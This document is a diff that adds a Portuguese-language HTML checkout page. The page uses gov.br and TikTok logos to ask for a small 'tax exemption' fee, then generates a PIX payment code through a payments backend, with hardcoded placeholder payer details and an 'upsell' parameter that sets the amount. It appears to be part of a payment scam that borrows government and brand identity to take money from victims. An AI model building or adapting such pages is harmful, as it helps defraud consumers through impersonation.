@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout - Isenção Fiscal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
+        body { font-family: 'Figtree', sans-serif; background-color: white; }
+        .btn-tiktok { background-color: #FE2C55; box-shadow: 0 10px 10px rgba(254, 44, 85, 0.4); transition: all 0.3s; }
+        .btn-tiktok:active { transform: scale(0.95); }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="flex flex-col items-center w-full max-w-md p-6 text-center mx-auto">
+        <img src="https://logodownload.org/wp-content/uploads/2022/05/gov.br-logo-4.png" class="h-6 mb-4 opacity-70">
+        <img src="https://images.seeklogo.com/logo-png/36/2/tiktok-logo-png_seeklogo-368491.png" class="h-24 mb-8">
+
+        <div class="bg-white rounded-[2.5rem] shadow-2xl p-8 border border-gray-100 mb-8 w-full">
+            <p class="text-gray-400 font-bold text-[10px] uppercase tracking-widest mb-4">Taxa reduzida para apenas:</p>
+            <div class="text-4xl font-black text-gray-900 italic mb-6" id="paymentValue">R$ 9,90</div>
+
+            <div id="loading" class="flex flex-col items-center justify-center min-h-[400px]">
+                <div class="text-center">
+                    <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-[#FE2C55] border-t-transparent mb-6"></div>
+                    <p class="text-gray-700 font-bold text-lg">Gerando código PIX...</p>
+                    <p class="text-gray-500 text-sm mt-2">Aguarde um momento</p>
+                </div>
+            </div>
+
+            <div id="qrcodeSection" class="hidden">
+                <div class="text-center mb-6">
+                    <h3 class="text-2xl font-black mb-2 text-gray-900">Escaneie o QR Code</h3>
+                    <p class="text-gray-500 text-sm">Ou copie o código PIX abaixo</p>
+                </div>
+                <div class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-xl p-8 mb-6 flex justify-center shadow-inner">
+                    <img id="qrCodeImage" src="" alt="QR Code PIX" class="max-w-full rounded-lg">
+                </div>
+                <div class="mb-6">
+                    <label class="block text-sm font-bold text-gray-700 mb-3">Código PIX (Copiar e Colar)</label>
+                    <div class="flex gap-2">
+                        <input type="text" id="pixCode" readonly class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono">
+                        <button onclick="copyPixCode()" class="btn-tiktok px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all">COPIAR</button>
+                    </div>
+                </div>
+                <!-- Instruções de Pagamento PIX -->
+                <div class="bg-gradient-to-r from-emerald-50 to-teal-50 rounded-2xl p-5 mb-6 border border-emerald-200">
+                    <h4 class="text-base font-black text-emerald-800 mb-4 flex items-center gap-2">
+                        <span class="text-xl">📱</span> Como pagar com PIX
+                    </h4>
+                    <div class="space-y-3">
+                        <div class="flex items-start gap-3">
+                            <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0"><span class="text-white text-xs font-bold">1</span></div>
+                            <p class="text-sm text-gray-700">Abra o <strong>app do seu banco</strong> no celular</p>
+                        </div>
+                        <div class="flex items-start gap-3">
+                            <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0"><span class="text-white text-xs font-bold">2</span></div>
+                            <p class="text-sm text-gray-700">Escolha <strong>PIX</strong> e selecione <strong>"Copia e Cola"</strong> ou <strong>"QR Code"</strong></p>
+                        </div>
+                        <div class="flex items-start gap-3">
+                            <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0"><span class="text-white text-xs font-bold">3</span></div>
+                            <p class="text-sm text-gray-700"><strong>Cole o código</strong> ou <strong>escaneie o QR Code</strong></p>
+                        </div>
+                        <div class="flex items-start gap-3">
+                            <div class="w-7 h-7 bg-emerald-500 rounded-full flex items-center justify-center flex-shrink-0"><span class="text-white text-xs font-bold">4</span></div>
+                            <p class="text-sm text-gray-700">Confirme e <strong>aguarde a confirmação</strong></p>
+                        </div>
+                    </div>
+                </div>
+                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
+                    <p class="text-sm text-gray-700">
+                        <strong class="text-blue-700">Aguardando pagamento...</strong><br>
+                        <span class="text-gray-600">O status será atualizado automaticamente.</span>
+                    </p>
+                </div>
+                <div id="paymentStatus" class="text-center text-sm font-bold text-gray-600 mb-4">Status: Aguardando pagamento</div>
+            </div>
+
+            <div id="successSection" class="hidden text-center py-8">
+                <div class="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                </div>
+                <h3 class="text-xl font-black mb-2 text-green-600">Pagamento Confirmado!</h3>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const upsellId = urlParams.get('upsell') || 'back';
+        let transactionId = null;
+        let checkInterval = null;
+        let isGeneratingPix = false; // Flag para evitar múltiplas requisições simultâneas
+
+        // NÃO USA MAIS LOCALSTORAGE PARA PIX
+        // SEMPRE gera novo PIX ao vivo na API da Paradise
+
+        const defaultData = {
+            payerName: 'Cliente',
+            email: 'cliente@gmail.com',
+            document: '76897587621',
+            phone: '11999999999'
+        };
+
+        async function loadUpsellValueAndGeneratePix() {
+            // Proteção: evita múltiplas requisições simultâneas
+            if (isGeneratingPix) {
+                console.log('⚠️ PIX já está sendo gerado, aguardando...');
+                return;
+            }
+            
+            isGeneratingPix = true;
+            
+            try {
+                // Buscar valor (com timestamp para evitar cache)
+                const valueResponse = await fetch(`../../paradise/get-upsell-value.php?upsell=${upsellId}&_t=${Date.now()}`);
+                const valueData = await valueResponse.json();
+                const value = valueData.value || 0;
+                
+                if (valueData.success) {
+                    document.getElementById('paymentValue').textContent = valueData.formatted;
+                }
+
+                // SEMPRE gera novo PIX ao vivo - NUNCA reutiliza PIX antigo
+                // Gera ID único para cada requisição (timestamp + 2 randoms para garantir unicidade)
+                const uniqueId = Date.now() + '-' + Math.random().toString(36).substring(2, 15) + '-' + Math.random().toString(36).substring(2, 15);
+                console.log('🆕 GERANDO NOVO PIX ao vivo para', upsellId, '- UniqueID:', uniqueId, '- Timestamp:', Date.now());
+                
+                // Gera novo PIX ao vivo na API da Paradise
+                const response = await fetch('../../paradise/payments.php?_t=' + uniqueId + '&_r=' + Math.random(), {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'Pragma': 'no-cache',
+                        'Expires': '0',
+                        'X-Request-ID': uniqueId // Header único para cada requisição
+                    },
+                    body: JSON.stringify({
+                        value: value,
+                        payerName: defaultData.payerName,
+                        email: defaultData.email,
+                        document: defaultData.document,
+                        phone: defaultData.phone,
+                        productName: `Desconto Fiscal - ${upsellId.toUpperCase()}`,
+                        _timestamp: Date.now(),
+                        _uniqueId: uniqueId, // ID único para garantir nova transação
+                        _forceNew: true // Força geração de novo PIX sempre
+                    })
+                });
+
+                const result = await response.json();
+                
+                // LOG DETALHADO para debug
+                console.log('========================================');
+                console.log('RESPOSTA DO SERVIDOR:');
+                console.log('TransactionId:', result.transactionId);
+                console.log('Reference:', result.reference);
+                console.log('PIX (10 chars):', result.pixCode ? result.pixCode.substring(0, 10) : 'N/A');
+                console.log('========================================');
+
+                // Se a API falhar, mostra erro - NUNCA injeta PIX antigo
+                if (!result.success || !result.paymentInfo) {
+                    const errorMsg = result.error || 'Erro desconhecido ao gerar pagamento';
+                    console.error('Erro ao gerar PIX:', errorMsg);
+                    alert('Erro ao gerar PIX: ' + errorMsg);
+                    document.getElementById('loading').classList.remove('hidden');
+                    document.getElementById('qrcodeSection').classList.add('hidden');
+                    return;
+                }
+
+                // PIX gerado com sucesso - usa os dados retornados
+                transactionId = result.transactionId;
+                console.log('PIX gerado com sucesso ao vivo:', result.transactionId);
+                
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('qrcodeSection').classList.remove('hidden');
+                
+                if (result.paymentInfo.base64QrCode) {
+                    document.getElementById('qrCodeImage').src = result.paymentInfo.base64QrCode;
+                }
+                document.getElementById('pixCode').value = result.pixCode;
+                startPaymentCheck();
+            } catch (error) {
+                console.error('Erro:', error);
+                alert('Erro ao processar pagamento');
+            } finally {
+                // Libera a flag para permitir nova geração
+                setTimeout(() => {
+                    isGeneratingPix = false;
+                }, 500);
+            }
+        }
+
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode');
+            pixCode.select();
+            document.execCommand('copy');
+            alert('Código PIX copiado!');
+        }
+
+        function startPaymentCheck() {
+            checkInterval = setInterval(async () => {
+                if (!transactionId) return;
+                try {
+                    const response = await fetch(`../../paradise/payments.php?transactionId=${transactionId}`);
+                    const result = await response.json();
+                    if (result.success) {
+                        document.getElementById('paymentStatus').textContent = `Status: ${result.status}`;
+                        if (result.status === 'APPROVED') {
+                            clearInterval(checkInterval);
+                            document.getElementById('qrcodeSection').classList.add('hidden');
+                            document.getElementById('successSection').classList.remove('hidden');
+                        }
+                    }
+                } catch (error) {
+                    console.error('Erro ao verificar pagamento:', error);
+                }
+            }, 3000);
+        }
+
+        loadUpsellValueAndGeneratePix();
+    </script>
+</body>
+</html>
+
